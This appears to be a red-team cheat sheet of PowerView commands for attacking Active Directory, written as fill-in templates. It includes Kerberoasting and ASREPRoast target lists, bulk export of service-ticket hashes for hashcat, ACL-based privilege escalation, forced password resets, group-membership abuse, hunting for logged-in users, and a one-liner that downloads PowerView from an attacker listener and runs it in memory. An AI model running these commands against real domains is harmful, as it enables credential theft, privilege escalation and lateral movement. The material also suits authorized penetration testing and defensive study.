# Powerview

## ldap - enum - powerview - get - local

### AdminCount users

Users with `adminCount=1`. Marks accounts protected by AdminSDHolder, i.e. (formerly) privileged.

```sh title:"Powerview AdminSDHolder-protected users (adminCount=1)"
Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
```
<!-- cheat -->

### Unconstrained delegation users

Users with the TRUSTED_FOR_DELEGATION UAC bit. Compromise often equals domain compromise.

```sh title:"Powerview TRUSTED_FOR_DELEGATION users (UAC bit 524288)"
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
<!-- cheat -->

### Constrained delegation users

Users marked TrustedToAuth, i.e. configured for constrained delegation with protocol transition (S4U2Self/Proxy).

```sh title:"Powerview TrustedToAuth users for S4U2Self / S4U2Proxy abuse"
Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof
```
<!-- cheat -->

### ASREPRoast candidates

Users with KerberosPreauthNotRequired set. AS-REP can be requested without creds and cracked offline.

```sh title:"Powerview KerberosPreauthNotRequired users (ASREPRoast targets)"
Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
```
<!-- cheat -->

### Unconstrained delegation computers

Computer accounts with TRUSTED_FOR_DELEGATION. Coerce + dump LSASS for any TGT that ever lands on them.

```sh title:"Powerview Computers with unconstrained delegation, coerce candidates"
Get-DomainComputer -Unconstrained
```
<!-- cheat -->

### ACLs by SID

Filter resolved ACLs to only those granted to a specific SID. Used after Convert-NameToSid to find what your principal can write.

```sh title:"Powerview Filter ACLs to entries granted to a specific SID"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```
<!-- cheat
var sid
-->

### Object ACL

Read the DACL of one named object. Direct way to see who controls it.

```sh title:"Powerview Read DACL of one named object directly"
Get-DomainObjectAcl -Identity $user
```
<!-- cheat
var user
-->

### Constrained delegation computers

Computer accounts with TrustedToAuth (S4U2Self/Proxy). Often a privesc shortcut to any service hosted on them.

```sh title:"Powerview Computers with TrustedToAuth, S4U privesc candidates"
Get-DomainComputer -TrustedToAuth
```
<!-- cheat -->

## ldap - powerview - misc - local

### CSV export

Thread-safe CSV append helper from PowerView. Handy when piping cmdlet output across runspaces.

```sh title:"Powerview Thread-safe CSV append helper across runspaces"
Export-PowerViewCSV
```
<!-- cheat -->

### Resolve hostname

Resolve a hostname to an IP using PowerView's helper.

```sh title:"Resolve hostname to IP via PowerView helper"
Resolve-IPAddress
```
<!-- cheat -->

### Convert name to SID

Convert a user/group name to a SID for ACL filtering and ticketer.

```sh title:"Powerview Convert user/group name to SID for ACL / ticketer"
ConvertTo-SID
```
<!-- cheat -->

### Convert name to SID (var)

Concrete one-liner that stores the SID into `$sid` for follow-on ACL queries.

```sh title:"Powerview Resolve target SID into $sid for follow-on ACL queries"
$sid = Convert-NameToSid $target_user
```
<!-- cheat
var target_user
-->

### Convert AD name format

Convert object names between sAMAccountName, UPN, DN, NT4, etc. Useful for switching identifier styles between tools.

```sh title:"Powerview Convert between sAMAccountName / UPN / DN / NT4"
Convert-ADName
```
<!-- cheat -->

### Decode UAC value

Decode a userAccountControl integer into the named flags.

```sh title:"Powerview Decode UAC integer into named flag list"
ConvertFrom-UACValue
```
<!-- cheat -->

### Add remote connection

Mount a remote path with a supplied PSCredential. Lets cmdlets reach a host you don't have implicit creds for.

```sh title:"Powerview Mount remote path with supplied PSCredential"
Add-RemoteConnection
```
<!-- cheat -->

### Remove remote connection

Drop a connection created by Add-RemoteConnection. Always pair the two so you don't leak mounted drives.

```sh title:"Powerview Drop a previously added remote connection"
Remove-RemoteConnection
```
<!-- cheat -->

### Impersonate user

Spawn a `runas /netonly`-style logon and impersonate the resulting token. Pass-the-hash-friendly user impersonation.

```sh title:"Powerview runas /netonly impersonation, PtH-friendly"
Invoke-UserImpersonation
```
<!-- cheat -->

### Revert impersonation

Drop the impersonated token. Always pair with Invoke-UserImpersonation.

```sh title:"Powerview Drop impersonation token, pair with Invoke-UserImpersonation"
Invoke-RevertToSelf
```
<!-- cheat -->

### Request SPN ticket

Request a Kerberos service ticket for one SPN. Stepping stone to manual Kerberoasting.

```sh title:"Powerview Request TGS for one SPN, manual Kerberoast step"
Get-DomainSPNTicket
```
<!-- cheat -->

### Invoke-Kerberoast

Auto Kerberoast every reachable SPN-enabled account and return crackable hashes.

```sh title:"Powerview Auto-Kerberoast every reachable SPN account"
Invoke-Kerberoast
```
<!-- cheat -->

### Path ACLs

Read filesystem ACLs on a path with optional group recursion. Useful for finding writable paths via group nesting.

```sh title:"Powerview Filesystem ACLs with group recursion expand"
Get-PathAcl
```
<!-- cheat -->

## ldap - powerview - domain - local

### DNS zones

List ADIDNS zones in the domain.

```sh title:"Powerview List ADIDNS zones in the domain"
Get-DomainDNSZone
```
<!-- cheat -->

### DNS records

List DNS records in a given ADIDNS zone.

```sh title:"Powerview List DNS records in given ADIDNS zone"
Get-DomainDNSRecord
```
<!-- cheat -->

### Domain

Return the domain for the current (or specified) domain.

```sh title:"Powerview Domain for current/specified domain"
Get-Domain
```
<!-- cheat -->

### Domain controllers

Return the DCs for the current (or specified) domain.

```sh title:"Powerview Domain Controllers for current/specified domain"
Get-DomainController
```
<!-- cheat -->

### Forest object

Return the forest object for the current forest.

```sh title:"Powerview Forest object for current/specified forest"
Get-Forest
```
<!-- cheat -->

### Forest domains

Return all domains within the current forest.

```sh title:"Powerview All domains within current forest"
Get-ForestDomain
```
<!-- cheat -->

### Global catalogs

Return all global catalog servers in the forest.

```sh title:"Powerview All global catalog servers in the forest"
Get-ForestGlobalCatalog
```
<!-- cheat -->

### Outlier objects

Find users/groups/computers with attribute values that deviate from the population (anomaly detection).

```sh title:"Powerview Find AD objects with anomalous attribute values"
Find-DomainObjectPropertyOutlier
```
<!-- cheat -->

### Domain users

Return all users (or one specific user) from the domain.

```sh title:"Powerview Return all users (or one user) from the domain"
Get-DomainUser
```
<!-- cheat -->

### TGS hashcat for user

Pull a TGS for a user and format the hash for hashcat (mode 13100).

```sh title:"Powerview Pull TGS and format for hashcat 13100"
Get-DomainUser -Identity $user | Get-DomainSPNTicket -Format Hashcat
```
<!-- cheat
var user
-->

### List SPN holders

List every user with an SPN set (Kerberoast target list).

```sh title:"Powerview Every user with SPN set (Kerberoast list)"
Get-DomainUser * -spn | select samaccountname
```
<!-- cheat -->

### Bulk Kerberoast to CSV

Roast every SPN account and dump hashcat-formatted hashes into a CSV.

```sh title:"Powerview Bulk Kerberoast to CSV in hashcat format"
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\users_tgs.csv -NoTypeInformation
```
<!-- cheat -->

### New domain user

Create a new domain user (assuming the appropriate write rights).

```sh title:"Powerview Create new domain user, requires write rights"
New-DomainUser
```
<!-- cheat -->

### Set user password

Reset a domain user's password (cmdlet form, requires reset rights).

```sh title:"Powerview Reset domain user password (needs reset rights)"
Set-DomainUserPassword
```
<!-- cheat -->

### User logon events

Enumerate 4624 / 4648 logon events for the named user. Maps where the user has authenticated.

```sh title:"Powerview 4624 / 4648 logon events for the named user"
Get-DomainUserEvent
```
<!-- cheat -->

### Domain computers

Return all (or specified) computer objects.

```sh title:"Powerview All (or specified) computer objects"
Get-DomainComputer
```
<!-- cheat -->

### Domain object

Return all (or specified) AD objects regardless of class.

```sh title:"Powerview All (or specified) AD objects regardless of class"
Get-DomainObject
```
<!-- cheat -->

### Set SPN on user

Write a fake SPN onto a user. Triggers targeted Kerberoasting; leave the SPN bogus to avoid breaking anything real.

```sh title:"Powerview Write fake SPN for targeted Kerberoasting"
Set-DomainObject -Identity $user -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```
<!-- cheat
var user
-->

### Object ACLs

Read the DACL of an AD object.

```sh title:"Powerview Read DACL of an AD object"
Get-DomainObjectAcl
```
<!-- cheat -->

### Add object ACL

Add an ACE to an AD object's DACL (privesc setup).

```sh title:"Powerview Add ACE to AD object DACL (privesc setup)"
Add-DomainObjectAcl
```
<!-- cheat -->

### Interesting ACLs

Find ACEs in the domain granted to non-builtin principals (typical privesc paths).

```sh title:"Powerview ACEs granted to non-builtin principals (privesc paths)"
Find-InterestingDomainAcl
```
<!-- cheat -->

### OUs

List OUs.

```sh title:"Powerview List OUs in the domain"
Get-DomainOU
```
<!-- cheat -->

### Sites

List AD sites.

```sh title:"Powerview List AD sites"
Get-DomainSite
```
<!-- cheat -->

### Subnets

List AD-defined subnets.

```sh title:"Powerview List AD-defined subnets"
Get-DomainSubnet
```
<!-- cheat -->

### Domain SID

Return the domain SID. Required for ticketer (silver/golden) and SID-history.

```sh title:"Powerview Domain SID for ticketer / SID-history flows"
Get-DomainSID
```
<!-- cheat -->

### Domain groups

Return all (or specified) domain groups.

```sh title:"Powerview All (or specified) domain groups"
Get-DomainGroup
```
<!-- cheat -->

### New group

Create a new domain group (requires write rights).

```sh title:"Powerview Create new domain group, requires write rights"
New-DomainGroup
```
<!-- cheat -->

### Managed groups

Find security groups that have a `managedBy` set. The manager often has implicit write rights to membership.

```sh title:"Powerview Groups with managedBy set, manager often writes membership"
Get-DomainManagedSecurityGroup
```
<!-- cheat -->

### Group members

List members of a domain group.

```sh title:"Powerview List members of a domain group"
Get-DomainGroupMember
```
<!-- cheat -->

### Add to group

Add a user/group to an existing domain group.

```sh title:"Powerview Add principal to existing domain group"
Add-DomainGroupMember
```
<!-- cheat -->

### File servers

Return likely file servers in the domain (based on SPNs).

```sh title:"Powerview Likely file servers identified via SPNs"
Get-DomainFileServer
```
<!-- cheat -->

### DFS shares

Return all fault-tolerant DFS namespaces.

```sh title:"Powerview All fault-tolerant DFS namespaces"
Get-DomainDFSShare
```
<!-- cheat -->

## ldap - powerview - gpo - local

### GPO objects

Return all (or specified) GPO objects.

```sh title:"Powerview All (or specified) GPO objects"
Get-DomainGPO
```
<!-- cheat -->

### GPO local groups

GPOs that modify local group memberships via Restricted Groups / GPP.

```sh title:"Powerview GPOs that modify local group membership via RG/GPP"
Get-DomainGPOLocalGroup
```
<!-- cheat -->

### Map user to local groups

For a user/group, map every machine where GPO grants them local-group membership. Quick way to find lateral movement targets.

```sh title:"Powerview Machines where GPO grants user local-group membership"
Get-DomainGPOUserLocalGroupMapping
```
<!-- cheat -->

### Map computer's local groups

For a computer (or GPO), map who is in its local groups via GPO correlation.

```sh title:"Powerview Local-group membership of a computer via GPO"
Get-DomainGPOComputerLocalGroupMapping
```
<!-- cheat -->

### Default policy

Return the Default Domain or DC policy.

```sh title:"Powerview Default Domain Policy or DC Policy"
Get-DomainPolicy
```
<!-- cheat -->

## ldap - enumeration - powerview - computer - local

### Local groups

Enumerate local groups on the local or remote machine.

```sh title:"Powerview Local groups on local or remote machine"
Get-NetLocalGroup
```
<!-- cheat -->

### Local group members

Members of a specific local group on the local or remote machine.

```sh title:"Powerview Members of named local group on remote machine"
Get-NetLocalGroupMember
```
<!-- cheat -->

### Net shares

Open shares on the local or remote machine.

```sh title:"Powerview Open shares on the local or remote machine"
Get-NetShare
```
<!-- cheat -->

### Logged on users

Users logged on the local or remote machine (NetWkstaUserEnum).

```sh title:"Powerview Users logged on (NetWkstaUserEnum)"
Get-NetLoggedon
```
<!-- cheat -->

### Net sessions

Session info on the local or remote machine (NetSessionEnum). Maps where users are coming from.

```sh title:"Powerview Session info (NetSessionEnum), origin tracking"
Get-NetSession
```
<!-- cheat -->

### Reg logged on

Who's logged on, derived from remote registry hive paths under HKU.

```sh title:"Powerview Who's logged on via remote registry HKU paths"
Get-RegLoggedOn
```
<!-- cheat -->

### RDP sessions

Remote Desktop / Terminal Services sessions on the local or remote machine.

```sh title:"Powerview RDP / Terminal Services sessions on the host"
Get-NetRDPSession
```
<!-- cheat -->

### Test admin access

Test whether the current user has local admin on the target. Required for many post-exploitation primitives.

```sh title:"Powerview Test current user has local admin on target"
Test-AdminAccess
```
<!-- cheat -->

### Computer site

Return the AD site that the local or remote machine is in.

```sh title:"Powerview AD site that local or remote machine is in"
Get-NetComputerSiteName
```
<!-- cheat -->

### WPAD / proxy

Read WPAD / proxy config from the registry.

```sh title:"Powerview Read WPAD / proxy config from registry"
Get-WMIRegProxy
```
<!-- cheat -->

### Last logged-on user

Return the last interactive logon recorded in the registry.

```sh title:"Powerview Last interactive logon recorded in registry"
Get-WMIRegLastLoggedOn
```
<!-- cheat -->

### Cached RDP connections

RDP MRU history from the registry. Maps where users RDP from.

```sh title:"Powerview RDP MRU registry history, maps where users RDP from"
Get-WMIRegCachedRDPConnection
```
<!-- cheat -->

### Mounted drives

Saved network mounted drives from the registry. Often points to file servers / shares with creds saved.

```sh title:"Powerview Saved network drive mappings, often shares with creds"
Get-WMIRegMountedDrive
```
<!-- cheat -->

### Process list with owners

Process list with their owner SIDs via WMI.

```sh title:"Powerview Process list with owner SIDs via WMI"
Get-WMIProcess
```
<!-- cheat -->

### Find files

Search a path for files matching name / size / age criteria.

```sh title:"Powerview Search path for files by name / size / age"
Find-InterestingFile
```
<!-- cheat -->

## ldap - powerview - meta - local

### Find user logon

Find domain machines where the named user is currently logged in. Hunt mode for high-value users.

```sh title:"Powerview Hunt: machines where named user is currently logged in"
Find-DomainUserLocation
```
<!-- cheat -->

### Find process

Find domain machines running a named process.

```sh title:"Powerview Domain machines running a named process"
Find-DomainProcess
```
<!-- cheat -->

### Find user events

Find logon events for named users across the domain.

```sh title:"Powerview Logon events for named users across the domain"
Find-DomainUserEvent
```
<!-- cheat -->

### Find shares

Find reachable SMB shares on domain machines.

```sh title:"Powerview Reachable SMB shares on domain machines"
Find-DomainShare
```
<!-- cheat -->

### Find share files

Search readable domain shares for files matching criteria. Pair with Find-DomainShare.

```sh title:"Powerview Search readable shares for matching files"
Find-InterestingDomainShareFile
```
<!-- cheat -->

### Find local admin

Find machines where the current user has local admin. The lateral movement candidate list.

```sh title:"Powerview Machines where current user has local admin"
Find-LocalAdminAccess
```
<!-- cheat -->

### Domain local group members

Enumerate local-group membership on domain machines for a named local group.

```sh title:"Powerview Local-group membership across domain machines"
Find-DomainLocalGroupMember
```
<!-- cheat -->

## ldap - powerview - domain trusts - local

### Domain trusts

Return all domain trusts for the current or specified domain.

```sh title:"Powerview Domain trusts for current/specified domain"
Get-DomainTrust
```
<!-- cheat -->

### Forest trusts

Return all forest trusts.

```sh title:"Powerview All forest-level trusts"
Get-ForestTrust
```
<!-- cheat -->

### Foreign users

Users in groups outside the user's home domain. Cross-trust privesc indicator.

```sh title:"Powerview Users in groups outside their home domain"
Get-DomainForeignUser
```
<!-- cheat -->

### Foreign group members

Groups containing members from another domain. Maps where cross-domain trust gives access.

```sh title:"Powerview Groups with members from a foreign domain"
Get-DomainForeignGroupMember
```
<!-- cheat -->

### Trust mapping

Recursive trust enumeration starting at the current domain. Builds a full trust map.

```sh title:"Powerview Recursive trust map starting at current domain"
Get-DomainTrustMapping
```
<!-- cheat -->

### Reset password

Concrete password reset oneliner using a SecureString.

```sh title:"Powerview Reset password using SecureString conversion"
$newpass = ConvertTo-SecureString '$target_pass' -AsPlainText -Force; Set-DomainUserPassword -Identity $target_user -AccountPassword $newpass -Verbose
```
<!-- cheat
var target_user
var target_pass
-->

### Add user to group

Add a user to a group (privesc finalization step after ACL writes).

```sh title:"Powerview Add user to group, finalize ACL-based privesc"
Add-DomainGroupMember -Identity $group_name -Members $user -Verbose
```
<!-- cheat
var group_name
var user
-->

### Confirm membership

Read membership back to confirm the add succeeded.

```sh title:"Powerview Read membership back to confirm add"
Get-DomainGroupMember -Identity $group_name | select MemberName
```
<!-- cheat
var group_name
-->

### Clear SPNs

Remove all SPNs from a user (cleanup after targeted Kerberoasting).

```sh title:"Powerview Clear SPNs on user, cleanup after roast"
Set-DomainObject -Identity $user -Clear serviceprincipalname -Verbose
```
<!-- cheat
var user
-->

### Remove from group

Remove a user from a group (cleanup after privesc).

```sh title:"Powerview Remove user from group, cleanup after privesc"
Remove-DomainGroupMember -Identity $group_name -Members $user -Verbose
```
<!-- cheat
var group_name
var user
-->

## powerview - bootstrap

### In-memory load

Pull PowerView from an attacker HTTP listener and load it directly into the current PowerShell session - no disk drop.

```powershell title:"In-memory load PowerView from attacker server (no disk)"
(New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/PowerView.ps1') | IEX
```
<!-- cheat
import tun_ip
import lports
import scheme
-->

### Build PSCredential object

Build a `[PSCredential]` object for the `-Credential` parameter on any PowerView cmdlet (or any PowerShell cmdlet).

```powershell title:"Powerview Build PSCredential for -Credential parameter"
$passwd = ConvertTo-SecureString '$pass' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ('$domain\$user', $passwd)
```
<!-- cheat
import domain_ip
var user
var pass
-->

### Convert SID to name

Translate a SID string into the matching domain principal.

```powershell title:"Powerview Translate SID string to domain principal"
ConvertFrom-SID $sid
```
<!-- cheat
var sid
-->

### Find managed security groups

Lists security groups where non-admin users have been granted Manage rights — common privesc path via group membership.

```powershell title:"Powerview Find non-admin-managed security groups (privesc path)"
Find-ManagedSecurityGroups | select GroupName
```
<!-- cheat -->

